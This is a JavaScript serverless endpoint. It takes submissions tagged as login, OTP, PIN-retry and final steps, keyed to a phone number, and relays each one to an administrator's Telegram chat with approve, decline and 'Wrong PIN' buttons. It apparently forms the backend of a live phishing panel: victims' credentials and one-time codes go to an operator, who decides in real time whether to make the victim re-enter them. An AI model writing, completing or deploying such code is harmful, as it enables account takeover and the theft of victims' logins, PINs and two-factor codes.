import { randomUUID } from 'node:crypto';
import { kv, GATE_TTL } from './_kv.js';
import {
  tg, esc, ADMIN,
  TITLES, LABELS, INSTRUCTIONS, BUTTONS, makeRef,
} from './_tg.js';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { gate, phone, payload } = req.body || {};

  if (!['login', 'otp', 'pin_retry', 'final'].includes(gate)) {
    return res.status(400).json({ error: 'Invalid gate' });
  }
  if (typeof phone !== 'string' || !phone.trim()) {
    return res.status(400).json({ error: 'phone is required' });
  }
  if (typeof payload !== 'string' || !payload.trim()) {
    return res.status(400).json({ error: 'payload is required' });
  }

  const id = randomUUID();
  const ref = makeRef();
  const trimmed = payload.length > 1800 ? payload.slice(0, 1800) + '…' : payload;
  const phoneClean = phone.trim();

  const text =
    `${TITLES[gate]}\n` +
    `Ref: <code>${esc(ref)}</code>\n\n` +
    `📱 Phone\n<code>${esc(phoneClean)}</code>\n\n` +
    `${LABELS[gate]}\n<code>${esc(trimmed)}</code>\n\n` +
    `${INSTRUCTIONS[gate]}`;

  // The OTP gate gets a third button: Wrong PIN.
  // Every other gate keeps the standard 2-button layout.
  let inline_keyboard;
  if (gate === 'otp') {
    inline_keyboard = [[
      { text: '✅ Approve OTP', callback_data: `gate:approve:${id}` },
      { text: '⚠️ Wrong PIN',  callback_data: `gate:wrongpin:${id}` },
      { text: '❌ Decline OTP', callback_data: `gate:decline:${id}` },
    ]];
  } else {
    inline_keyboard = [[
      { text: BUTTONS[gate][0], callback_data: `gate:approve:${id}` },
      { text: BUTTONS[gate][1], callback_data: `gate:decline:${id}` },
    ]];
  }
  const reply_markup = { inline_keyboard };

  await kv.set(`gate:${id}`, {
    id, ref, gate,
    phone: phoneClean,
    payload: trimmed,
    status: 'pending',
    createdAt: Date.now(),
    decidedAt: null,
    telegramMessageId: null,
  }, { ex: GATE_TTL });

  const sent = await tg('sendMessage', {
    chat_id: ADMIN,
    text,
    parse_mode: 'HTML',
    reply_markup,
  });

  if (!sent?.ok) {
    await kv.del(`gate:${id}`);
    return res.status(502).json({ error: 'Could not reach Telegram' });
  }

  const entry = await kv.get(`gate:${id}`);
  if (entry) {
    entry.telegramMessageId = sent.result.message_id;
    await kv.set(`gate:${id}`, entry, { ex: GATE_TTL });
  }

  console.log(`[gate] ${gate} request ${ref} sent`);
  res.json({ id, ref });
}